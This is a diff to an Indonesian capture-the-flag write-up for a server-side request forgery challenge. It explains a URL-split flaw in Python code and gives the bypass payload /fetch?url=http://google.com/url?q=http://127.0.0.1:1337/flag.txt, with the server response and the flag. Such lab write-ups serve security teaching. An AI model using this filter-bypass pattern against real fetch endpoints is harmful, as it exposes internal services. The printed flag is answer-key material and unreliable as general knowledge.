@@ -185,44 +185,47 @@ PD9waHAKLy8gRGF0YWJhc2UgQ29uZmlndXJhdGlvbgokZGJfaG9zdCA9ICdsb2NhbGhvc3QnOwokZGJf
 <ol>
   <li>
     <p>
+      <strong>Analisis Tampilan Website:</strong>
+Jika kita lihat pada laman browser, terdapat input yang bisa kta masukkan kode berbahaya di sana. Untuk tampilannya seperti ini.
+</p>
+      
+<img width="1449" height="882" alt="Screenshot 2025-12-06 at 06 36 55" src="https://github.com/user-attachments/assets/02da3ef3-9c75-4732-ba4f-0e35d32fc007" />
+
+    
+  </li>
+  
+  <li>
+    <p>
       <strong>Analisis Source Code:</strong>
 Ditemukan celah pada logika Python: <code>url.split("google.com/url?q=")[1]</code>. Kode hanya mengambil bagian belakang string tanpa memvalidasi bagian depan.
     </p>
   </li>
-  <li>
-    <p>
-      <strong>Crafting Payload:</strong>
-Saya menyusun URL dengan format: <code>[Bypass Filter] + [Splitter] + [Internal Target]</code>.
-Target internal adalah <code>http://127.0.0.1:1337/flag</code>.
-</p>
-  <p>
-    <strong>Payload:</strong> <code>http://google.com/url?q=http://127.0.0.1:1337/flag</code>
-  </p>
-  </li>
-  
+
+
   <li>
     <p><strong>Eksploitasi:</strong>
-Mengirimkan request ke endpoint <code>/fetch</code> dengan payload tersebut.
-    </p><blockquote>
-      <p>
-        <em>
-          [MASUKKAN SCREENSHOT BROWSER/BURP SUITE SAAT REQUEST KE /FETCH]
-        </em>
-      </p>
-    </blockquote>
+Mengirimkan request <code>/fetch?url=http%3A%2F%2F10.15.42.23%3A5005%2F</code> di dalam Burp Suite dengan <code>fetch</code>.
+    </p>
+    <img width="1881" height="405" alt="Screenshot 2025-12-06 at 06 40 52" src="https://github.com/user-attachments/assets/d4e0e8df-a3b2-4dac-80f4-ea3dc35cd7a4" />
+  <p>Dapat dilihat bahwa kemungkinan terdapat kerentanan di sana</p>
+
+    
   </li>
   <li>
       <p>
         <strong>Hasil:</strong>
-          Server merespons dengan JSON yang berisi Flag dari layanan internal.
+          Setelah mencoba dengan kode <code>GET /fetch?url=http://google.com/url?q=http://127.0.0.1:1337/flag.txt</code>, server merespons dengan JSON yang berisi Flag dari layanan internal.
       </p>
-     <blockquote>
-        <p>
-          <em>
-            [MASUKKAN SCREENSHOT RESPON BERISI FLAG]
-          </em>
-        </p>
-      </blockquote>
+    <pre>
+
+            <div class="result">
+            <h3>Result for: http://google.com/url?q=http://127.0.0.1:1337/flag.txt</h3>
+                <div class="content">ETHACK{s1mpl3_ssrf_w1th_s0urc3_c0d3}</div>
+        </div>
+  </pre>
+  <p>Berdasarkan temuan di atas, dapat ditemukan sebuah flag yaitu
+    <pre>ETHACK{s1mpl3_ssrf_w1th_s0urc3_c0d3}</pre>
+  </p>
     </li>
   </ol>
 
